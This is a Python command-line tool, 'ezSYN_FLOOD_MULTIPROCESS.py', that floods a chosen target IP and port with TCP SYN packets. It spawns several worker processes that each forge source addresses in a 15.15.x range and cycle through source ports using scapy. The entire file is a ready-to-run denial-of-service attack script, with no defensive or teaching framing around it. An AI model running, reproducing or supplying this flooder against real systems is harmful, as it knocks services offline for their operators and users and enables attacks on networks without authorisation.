""" 
Usage:
  ezSYN_FLOOD_MULTIPROCESS.py <dst_ip> <dst_port> [--workers=<amount>] [--sleep=<seconds>]
Options:
  -h, --help            Show options
  --version             Version
  --workers=<amount>    How many processes to fire [default: 4]
  --sleep=<seconds>     How many seconds to sleep between shots [default: 0]
"""
from docopt import docopt
import logging
import sys
from multiprocessing import Process, current_process
import signal
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


def flood(src_net: str, dst_ip: str, dst_port: int, sleep: int):
    # the actual code that will be sending SYN packets
    for src_host in range(1, 254):
        for src_port in range(1024, 65535):
            # Build the packet
            src_ip = f"{src_net}.{src_host}"
            network_layer = IP(src=src_ip, dst=dst_ip)
            transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")

            # Send the packet
            try:
                send(network_layer/transport_layer, verbose=False)
            except Exception as e:
                print(f"[-] Something went terribly wrong: {e}")
                sys.exit()

            if sleep != 0:
                time.sleep(sleep)


def signal_handler(signal, frame):
    print(f"\n[-] CTRL+C, quiting...")
    sys.exit(0)


def main(arguments):
    dst_ip = arguments["<dst_ip>"]
    dst_port = int(arguments["<dst_port>"])
    workers = int(arguments["--workers"])
    sleep = int(arguments["--sleep"])
    
    signal.signal(signal.SIGINT, signal_handler)

    if workers < 1:
        print("[-] You need at least 1 worker to shoot for you at the target...")
        sys.exit()

    print("[!] Starting ez SYN MULTIPROCESS Flooder...")
    print(f"[~] Our Workers: {workers}")
    print(f"[~] Our Target: {dst_ip}")

    processes = []
    for worker in range(1, workers+1):
        src_net = f"15.15.{worker}"
        p = Process(target=flood, args=(src_net, dst_ip, dst_port, sleep), daemon=True)
        processes.append(p)
        p.start()

    for process in processes:
        if process is not None:
            process.join()
            


if __name__ == "__main__":
    arguments = docopt(__doc__, version="ezSYN_FLOOD_MULTIPROCESS v1.0")
    main(arguments)
